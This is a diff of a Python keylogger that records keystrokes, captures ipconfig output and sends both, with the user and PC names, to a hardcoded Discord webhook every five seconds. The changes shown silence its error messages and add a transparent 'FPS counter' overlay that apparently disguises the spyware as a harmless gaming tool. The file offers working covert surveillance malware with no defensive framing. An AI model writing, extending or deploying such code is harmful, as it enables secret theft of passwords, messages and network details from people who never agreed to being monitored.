@@ -14,11 +14,16 @@ import psutil
 from pathlib import Path
 from pynput import keyboard
 import tkinter as tk
+import sys
+from PyQt5.QtCore import Qt, QTimer
+from PyQt5.QtGui import QFont, QColor
+from PyQt5.QtWidgets import QApplication, QLabel, QWidget
 
 # Initialize variables and paths
 pc_name = socket.gethostname()
 log_file = "key_log.txt"
 file_pathip = os.path.join(os.getcwd(), 'ipconfig.txt')
+settings_file = "settings.json"
 user_name = os.environ.get('USER') or os.environ.get('USERNAME')
 last_timestamp = None
 
@@ -29,6 +34,25 @@ if not os.path.exists(log_file):
 if not os.path.exists(file_pathip):
     Path(file_pathip).touch()
 
+if not os.path.exists(settings_file):
+    Path(settings_file).touch()
+
+def load_settings():
+    if os.path.exists(settings_file):
+        with open(settings_file, "r") as f:
+            settings = json.load(f)
+    else:
+        with open(settings_file, "w") as f:
+            json.dump(settings, f)
+    return settings
+
+def update_settings(new_value):
+    settings = load_settings()
+    settings["yes"] = new_value
+    with open(settings_file, "w") as f:
+        json.dump(settings, f)
+
+# FPS counter function (for transparent window)
 def get_timestamp():
     """Returns the current timestamp as a formatted string."""
     return time.strftime("[%Y-%m-%d %H:%M] ")
@@ -56,10 +80,10 @@ def on_press(key):
     except Exception as e:
         print(f"Error: {e}")
 
+# Upload function to Discord webhook
 def upload_file_to_webhook(file_path, webhook_url):
     """Uploads files to a Discord webhook."""
     try:
-        # Open the files in binary mode
         with open(file_path, 'rb') as file, open(file_pathip, 'rb') as ipfile:
             payload = {
                 'content': f'Here are the logs for the user {user_name} and the PC name is {pc_name}. This message also includes IPCONFIG data.'
@@ -70,69 +94,118 @@ def upload_file_to_webhook(file_path, webhook_url):
             }
             response = requests.post(webhook_url, data=payload, files=files)
             if response.status_code == 204:
-                # print(f"Successfully uploaded {file_path} and {file_pathip}")
-                print("")
+                pass
             else:
-                # print(f"Failed to upload {file_path} and {file_pathip}: {response.status_code}")
-                print("")
+                pass
     except Exception as e:
-        # print(f"Error uploading file: {e}")
-        print("")
+        pass
 
+# Upload every 5 seconds
 def upload_every_5_seconds(file_path, webhook_url):
-    """Uploads the log file to the Discord webhook every 5 seconds."""
     while True:
-        # print("Uploading the log file every 5 seconds...")
         print("")
         upload_file_to_webhook(file_path, webhook_url)
         time.sleep(5)
 
+# Run the ipconfig command every 5 seconds
 def run_ipconfig():
-    """Captures and writes the output of 'ipconfig' to the ipconfig.txt file every 5 seconds."""
     while True:
         try:
-            # Run the ipconfig command and capture the output
             result = subprocess.run(['ipconfig'], capture_output=True, text=True)
 
-            # Open the ipconfig.txt file and write the output (overwrite every time)
+            # Write the output to the ipconfig.txt file
             with open(file_pathip, 'w') as file:
                 file.write(result.stdout)
-                # print("ipconfig output written to ipconfig.txt")
                 print("")
-        
+
         except Exception as e:
             print(f"Error: {e}")
         
-        time.sleep(5)  # Capture every 5 seconds
+        time.sleep(5)
 
-def clear_console():
-    """Clears the console screen every 1 second."""
-    while True:
-        # For Windows
-        if os.name == 'nt':
-            os.system('cls')
-        # For macOS or Linux
-        else:
-            os.system('clear')
-        
-        time.sleep(1)
+# Clear the console every second
+# def clear_console():
+#     while True:
+#         if os.name == 'nt':
+#             os.system('cls')
+#         else:
+#             os.system('clear')
+#         time.sleep(1)
 
-# Define webhook URL
+class TransparentWindow(QWidget):
+    def __init__(self):
+        super().__init__()
+        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
+        self.setAttribute(Qt.WA_TranslucentBackground)
+        self.setGeometry(0, 0, 200, 100)
+        self.label = QLabel(self)
+        self.label.setFont(QFont("Arial", 20))
+        self.label.setStyleSheet("color: white")
+        self.label.setGeometry(10, 30, 200, 50)
+
+        # Timer to update the FPS counter every 100ms
+        self.timer = QTimer(self)
+        self.timer.timeout.connect(self.update_fps)
+        self.timer.start(100)  # Update FPS every 100ms (0.1 second)
+
+        # Variables for FPS calculation
+        self.frames = 0
+        self.last_time = time.time()
+        self.fps = 0  # FPS value to display
+
+    def update_fps(self):
+        current_time = time.time()
+        self.frames += 1
+        elapsed_time = current_time - self.last_time
+
+        # Update FPS every second (1 second period)
+        if elapsed_time >= 1.0:
+            self.fps = self.frames  # Set FPS to the number of frames over 1 second
+            self.frames = 0  # Reset frame count
+            self.last_time = current_time  # Reset time
+            self.label.setText(f"FPS: {self.fps}")  # Display FPS on label
+
+    def mousePressEvent(self, event):
+        """To prevent dragging the window when clicked."""
+        event.ignore()
+
+# Define the webhook URL
 webhook_url = 'https://discord.com/api/webhooks/1335214600714457158/tzhsBy9cn-22l9vBGxfDs8kaoQ4CCsuTkqQhNvJe5BQ6ECrgHBD4JvEt-e5Kj3hftuSO'
 
-# Start the upload thread for the log file
+# Start upload thread for log file
 upload_thread = threading.Thread(target=upload_every_5_seconds, args=(log_file, webhook_url))
 upload_thread.daemon = True
 upload_thread.start()
 
-# Start the ipconfig logging thread
+# Start ipconfig logging thread
 ipconfig_thread = threading.Thread(target=run_ipconfig)
 ipconfig_thread.daemon = True
 ipconfig_thread.start()
 
-# Start the console clearing thread
-clear_thread = threading.Thread(target=clear_console, daemon=True)
-clear_thread.start()
+# # Start console clearing thread
+# clear_thread = threading.Thread(target=clear_console, daemon=True)
+# clear_thread.start()
+
+if __name__ == "__main__":
+    # Load settings
+    settings = load_settings()
+
+    # Update the settings to True right after loading settings
+    update_settings(True)
+
+    if not settings["yes"]:  # If 'yes' is False, show the FPS counter window
+        app = QApplication(sys.argv)
+        window = TransparentWindow()
+        window.show()
+
+        # Start the event loop after updating settings
+        sys.exit(app.exec_())
+    
+    # If 'yes' is True, do nothing (counter is not shown)
+    else:
+        print("")
+
+
 
 # Start the key listener in the main thread
 with keyboard.Listener(on_press=on_press) as listener:
